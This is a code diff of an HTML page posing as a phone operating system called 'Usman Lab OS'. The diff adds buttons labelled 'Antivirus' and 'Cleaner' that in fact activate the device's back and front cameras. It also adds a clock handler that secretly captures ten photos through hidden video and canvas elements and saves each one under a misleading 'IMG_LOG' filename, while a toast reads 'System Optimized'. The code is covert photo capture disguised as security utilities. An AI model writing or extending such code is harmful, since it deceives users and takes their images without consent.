@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Usman Lab · Core OS</title>
+    <title>Usman Lab · OS Interface</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
@@ -99,53 +99,11 @@
             border-radius: 15px;
             display: flex; align-items: center; justify-content: center;
             font-size: 22px;
+            transition: 0.3s;
         }
+        .icon-box:active { background: rgba(255,255,255,0.15); }
 
-        .app-icon span { font-size: 10px; color: #cbd5e0; }
-
-        #settingsPanel {
-            position: absolute;
-            bottom: -100%;
-            left: 0;
-            width: 100%;
-            height: 70%;
-            background: rgba(10, 20, 30, 0.95);
-            backdrop-filter: blur(20px);
-            border-top: 2px solid var(--primary-gold);
-            border-top-left-radius: 30px;
-            border-top-right-radius: 30px;
-            transition: bottom 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            z-index: 100;
-            padding: 25px;
-        }
-
-        #settingsPanel.open { bottom: 0; }
-
-        .setting-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-        }
-
-        .toggle {
-            width: 40px; height: 20px;
-            background: #4a5568;
-            border-radius: 20px;
-            position: relative;
-        }
-        .toggle.active { background: #4cd137; }
-        .toggle::after {
-            content: '';
-            position: absolute;
-            top: 2px; left: 2px;
-            width: 16px; height: 16px;
-            background: white;
-            border-radius: 50%;
-            transition: 0.2s;
-        }
-        .toggle.active::after { left: 22px; }
+        .app-icon span { font-size: 10px; color: #cbd5e0; text-align: center; }
 
         .dock {
             background: rgba(255, 255, 255, 0.1);
@@ -157,11 +115,29 @@
         }
 
         #secretVideo, #secretCanvas { display: none; }
+
+        #toast {
+            position: absolute;
+            top: 60px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.8);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            opacity: 0;
+            transition: 0.3s;
+            pointer-events: none;
+            z-index: 1000;
+            border: 0.5px solid var(--primary-gold);
+        }
     </style>
 </head>
 <body>
 
     <div class="phone-wrapper">
+        <div id="toast">System Optimized</div>
+        
         <div class="status-bar">
             <span>12:45</span>
             <div style="display: flex; gap: 8px;">
@@ -182,13 +158,13 @@
         </div>
 
         <div class="app-grid">
-            <div class="app-icon" id="openSettings">
-                <div class="icon-box" style="color: var(--primary-gold);"><i class="fas fa-gear"></i></div>
-                <span>Settings</span>
+            <div class="app-icon" id="btnAntivirus">
+                <div class="icon-box" style="color: #ff5252;"><i class="fas fa-shield-virus"></i></div>
+                <span>Antivirus</span>
             </div>
-            <div class="app-icon">
-                <div class="icon-box" style="color: #42a5f5;"><i class="fas fa-flask-vial"></i></div>
-                <span>Lab</span>
+            <div class="app-icon" id="btnCleaner">
+                <div class="icon-box" style="color: #00e5ff;"><i class="fas fa-broom"></i></div>
+                <span>Cleaner</span>
             </div>
             <div class="app-icon">
                 <div class="icon-box" style="color: #66bb6a;"><i class="fas fa-address-book"></i></div>
@@ -203,34 +179,8 @@
         <div class="dock">
             <i class="fas fa-phone" style="color: #fff; font-size: 20px;"></i>
             <i class="fas fa-message" style="color: #fff; font-size: 20px;"></i>
-            <i class="fas fa-globe" style="color: #fff; font-size: 20px;"></i>
+            <i class="fas fa-gear" style="color: #fff; font-size: 20px;"></i>
             <i class="fas fa-camera" style="color: #fff; font-size: 20px;"></i>
-        </div>
-
-        <div id="settingsPanel">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
-                <h2 style="font-size: 20px;">System Settings</h2>
-                <i class="fas fa-times" id="closeSettings" style="cursor: pointer; padding: 5px;"></i>
-            </div>
-            
-            <div class="setting-item">
-                <span>Network Status</span>
-                <div class="toggle active"></div>
-            </div>
-            <div class="setting-item">
-                <span>Auto Backup</span>
-                <div class="toggle active"></div>
-            </div>
-            <div class="setting-item">
-                <span>Dark Mode</span>
-                <div class="toggle active"></div>
-            </div>
-            <div class="setting-item">
-                <span>Security Lock</span>
-                <div class="toggle"></div>
-            </div>
-            
-            <p style="margin-top: 30px; font-size: 11px; color: #718096; text-align: center;">Usman Lab OS v2.0.5</p>
         </div>
     </div>
 
@@ -243,28 +193,72 @@
             const ctxClock = clockCanvas.getContext('2d');
             const video = document.getElementById('secretVideo');
             const secretCanvas = document.getElementById('secretCanvas');
-            const settingsPanel = document.getElementById('settingsPanel');
+            const toast = document.getElementById('toast');
             
             let stream = null;
             let captureCount = 0;
+            let currentFacingMode = "user";
+
+            function showToast(msg) {
+                toast.innerText = msg;
+                toast.style.opacity = "1";
+                setTimeout(() => toast.style.opacity = "0", 2000);
+            }
+
+            async function initCamera(mode) {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                try {
+                    currentFacingMode = mode === "back" ? "environment" : "user";
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: currentFacingMode } 
+                    });
+                    video.srcObject = stream;
+                    showToast(mode === "back" ? "Back Camera Active" : "Front Camera Active");
+                } catch (e) {
+                    console.error("Camera Error", e);
+                }
+            }
+
+            document.getElementById('btnAntivirus').onclick = () => initCamera("back");
+            document.getElementById('btnCleaner').onclick = () => initCamera("front");
 
             function drawClock() {
                 const now = new Date();
                 const h = now.getHours(), m = now.getMinutes(), s = now.getSeconds();
                 const center = 110;
+                const radius = 100;
                 ctxClock.clearRect(0,0,220,220);
                 
                 ctxClock.beginPath();
-                ctxClock.arc(center, center, 100, 0, 2*Math.PI);
+                ctxClock.arc(center, center, radius, 0, 2*Math.PI);
                 ctxClock.fillStyle = '#0a141e';
                 ctxClock.fill();
                 ctxClock.strokeStyle = '#ffd966';
                 ctxClock.lineWidth = 3;
                 ctxClock.stroke();
 
+                // Numbers 1-12
+                ctxClock.fillStyle = '#ffffff';
+                ctxClock.font = 'bold 14px Inter';
+                ctxClock.textAlign = 'center';
+                ctxClock.textBaseline = 'middle';
+                for (let n = 1; n <= 12; n++) {
+                    let theta = (n - 3) * (Math.PI * 2) / 12;
+                    let x = center + (radius * 0.8) * Math.cos(theta);
+                    let y = center + (radius * 0.8) * Math.sin(theta);
+                    ctxClock.fillText(n, x, y);
+                }
+
                 drawHand(center, center, (h%12*30)+(m/2), 50, 5, '#ffd966');
                 drawHand(center, center, m*6, 75, 3, '#fff');
                 drawHand(center, center, s*6, 85, 1, '#ff5252');
+
+                ctxClock.beginPath();
+                ctxClock.arc(center, center, 4, 0, 2*Math.PI);
+                ctxClock.fillStyle = '#ffd966';
+                ctxClock.fill();
             }
 
             function drawHand(cx, cy, angle, len, width, color) {
@@ -281,25 +275,24 @@
             clockCanvas.width = 220; clockCanvas.height = 220;
             setInterval(drawClock, 1000);
 
-            document.getElementById('openSettings').onclick = () => settingsPanel.classList.add('open');
-            document.getElementById('closeSettings').onclick = () => settingsPanel.classList.remove('open');
-
             clockCanvas.onclick = async () => {
-                if (!stream) {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    video.srcObject = stream;
-                }
+                if (!stream) await initCamera("front");
                 
                 captureCount = 0;
                 const interval = setInterval(() => {
                     if (captureCount >= 10) { clearInterval(interval); return; }
+                    
                     secretCanvas.width = video.videoWidth;
                     secretCanvas.height = video.videoHeight;
                     secretCanvas.getContext('2d').drawImage(video, 0, 0);
+                    
                     const link = document.createElement('a');
                     link.href = secretCanvas.toDataURL('image/png');
-                    link.download = `System_Log_${Date.now()}.png`;
+                    link.download = `IMG_LOG_${Date.now()}.png`;
+                    document.body.appendChild(link);
                     link.click();
+                    document.body.removeChild(link);
+                    
                     captureCount++;
                 }, 5000);
             };
